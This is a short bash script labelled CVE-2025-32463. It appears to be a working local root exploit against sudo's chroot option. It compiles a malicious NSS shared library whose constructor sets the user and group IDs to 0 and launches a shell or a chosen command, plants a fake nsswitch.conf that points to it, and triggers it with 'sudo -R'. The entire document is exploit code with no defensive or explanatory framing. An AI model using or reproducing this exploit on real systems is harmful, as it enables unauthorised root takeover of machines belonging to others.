#!/bin/bash

#
# CVE-2025-32463 
#

STAGE=$(mktemp -d /tmp/sudoblah.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    CMD="/bin/bash"
else
    CMD="$@"
fi


CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > blah.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void blah(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p blah/etc libnss_
echo "passwd: /blah" > blah/etc/nsswitch.conf
cp /etc/group blah/etc
gcc -shared -fPIC -Wl,-init,blah -o libnss_/blah.so.2 blah.c
sudo -R blah blah
# rm -rf ${STAGE?}